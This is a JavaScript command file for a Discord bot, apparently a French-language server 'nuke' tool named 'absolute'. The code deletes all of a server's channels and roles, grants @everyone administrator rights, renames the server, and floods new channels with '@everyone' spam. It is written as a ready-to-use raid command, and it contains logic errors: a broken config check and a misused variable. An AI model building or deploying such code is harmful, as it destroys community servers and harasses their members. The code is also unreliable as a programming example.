const config = require('../config.json');
exports.run = (client, message, args) => {
    if (!config.spam) return console.log('"../config.json > ligne 4" mal configuré, lancement arrêté.');
    if (!config.name) return console.log('"../config.json > ligne 2" mal configuré, lancement arrêté.');
    if (!config.type) return console.log('"../config.json > ligne 3" mal configuré, lancement arrêté.');
    if (!config.type !== '1' || '2' || '3') return console.log('"../config.json > ligne 3" mal configuré, lancement arrêté.');

    Promise.all(message.guild.channels.map(c => c.delete()));
    message.guild.roles.find('name', '@everyone').edit({
        permissions: [8]
    });
    Promise.all(message.guild.roles.map(c => c.delete()));
    message.guild.createRole({
        name: 'undefined-1'
    });
    message.guild.edit({
        name: config.name
    });
    if (config.spam === '1') {
        message.guild.createChannel('undefined-156');
        message.guild.channels.find('name', 'undefined-156').send('spam @everyone');
        message.channel.send('spam @everyone');
        function entierAleatoire(min, max){
            return Math.floor(Math.random() * (max - min + 1)) + min;
        }
        async function superspam(value, key, map){
            const rndm = entierAleatoire(10, 0);
            const rndl = entierAleatoire(50, 25);
            message.guild.createChannel(rndm + `${key}`, 'text');
            message.guild.createChannel(rndl + `${key}`, 'text');
            const chnl1 = await client.channels.find('name', rndm + `${key}`);
            const chnl2 = await client.channels.find('name', rndl + `${key}`);
            await client.channels.get(chnl1.id).send('spam @everyone')
                .catch(console.error);
            await client.channels.get(chnl2.id).send('spam @everyone')
                .catch(console.error);
        };
        
        message.guild.channels.map(c => c.name)
            .forEach(superspam);    
    }
    if (config.spam === '0') {
        if (config.type === '1') {
            const typer = 'text';
        }
        if (config.type === '2') {
            const typer = 'voice';
        }
        if (config.type === '3') {
            const typer = 'category';
        }
        message.guild.createChannel('undefined-3', config.typer);
    }
}

exports.conf = {
    permLevel: 4,
    aliases: []
}

exports.help = {
    name: 'absolute'
}